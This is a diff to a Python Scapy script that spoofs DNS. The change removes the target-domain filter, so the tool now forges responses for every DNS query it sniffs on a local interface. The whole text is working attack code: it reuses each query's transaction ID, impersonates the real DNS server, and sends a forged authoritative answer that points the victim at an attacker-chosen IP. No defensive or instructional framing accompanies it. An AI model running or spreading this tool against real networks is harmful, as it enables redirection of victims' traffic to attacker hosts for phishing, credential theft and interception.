@@ -1,49 +1,40 @@
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Ether, sendp  # Import Scapy layers
-import logging  # Optional, used for debugging or logs
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Ether, sendp
+import logging
 
-def spoof_dns_packet(pkt, spoofed_domains, fake_ip, attacker_mac, iface):
-    # Check if it's a DNS query (qr == 0 means it's a query, not a response)
+def spoof_dns_packet(pkt, fake_ip, attacker_mac, iface):
+    # Check if it's a DNS query (qr == 0)
     if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
-        queried_domain = pkt[DNSQR].qname.decode().strip(".")  # Remove trailing dot
-        victim_ip = pkt[IP].src  # Get the IP of the victim who made the request
+        queried_domain = pkt[DNSQR].qname.decode().strip(".")
+        victim_ip = pkt[IP].src
 
-        # If the queried domain is one of the spoofed targets
-        if queried_domain in spoofed_domains:
-            print("[+] Spoofing DNS response for {} → {}".format(queried_domain, fake_ip))
+        print("[*] DNS request detected for: {}".format(queried_domain))
+        print("[+] Spoofing all DNS responses to: {}".format(fake_ip))
 
-            # Build a forged DNS response
-            ether = Ether(src=attacker_mac, dst=pkt[Ether].src)  # Ethernet header
-            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)  # IP header: source is the real DNS server
-            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)  # UDP header with reversed ports
-            dns = DNS(
-                id=pkt[DNS].id,  # Use the same DNS transaction ID
-                qr=1,  # This is a response
-                aa=1,  # Authoritative answer
-                qd=pkt[DNS].qd,  # Use original query
-                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)  # Spoofed answer
-            )
+        # Build spoofed DNS response
+        ether = Ether(src=attacker_mac, dst=pkt[Ether].src)
+        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+        dns = DNS(
+            id=pkt[DNS].id,
+            qr=1, aa=1, qd=pkt[DNS].qd,
+            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)
+        )
 
-            # Combine all layers into one packet
-            spoofed_response = ether / ip / udp / dns
+        spoofed_response = ether / ip / udp / dns
+        sendp(spoofed_response, iface=iface, verbose=False)
 
-            # Send the forged DNS packet to the victim
-            sendp(spoofed_response, iface=iface, verbose=False)
+def start_dns_spoofer(fake_ip, attacker_mac, iface):
+    from scapy.all import sniff
 
-def start_dns_spoofer(spoofed_domains, fake_ip, attacker_mac, iface):
-    # Starts the DNS sniffer on the given interface
-    from scapy.all import sniff  # Import sniff only when needed
-
-    print("[*] Starting DNS spoofing...")
-    print("[*] Spoofed domains: {}".format(spoofed_domains))
+    print("[*] Starting DNS spoofing (ALL domains)...")
     print("[*] Responding with fake IP: {}".format(fake_ip))
 
     try:
-        # Sniff DNS requests and process each packet with spoof_dns_packet
         sniff(
-            iface=iface,  # Interface to listen on
-            filter="udp port 53",  # Only listen to DNS traffic
-            prn=lambda pkt: spoof_dns_packet(pkt, spoofed_domains, fake_ip, attacker_mac, iface),  # Callback
-            store=False  # Don't store packets in memory
+            iface=iface,
+            filter="udp port 53",
+            prn=lambda pkt: spoof_dns_packet(pkt, fake_ip, attacker_mac, iface),
+            store=False
         )
     except KeyboardInterrupt:
-        print("\n[!] DNS spoofing stopped by user.")  # Graceful exit on Ctrl+C
+        print("\n[!] DNS spoofing stopped by user.")
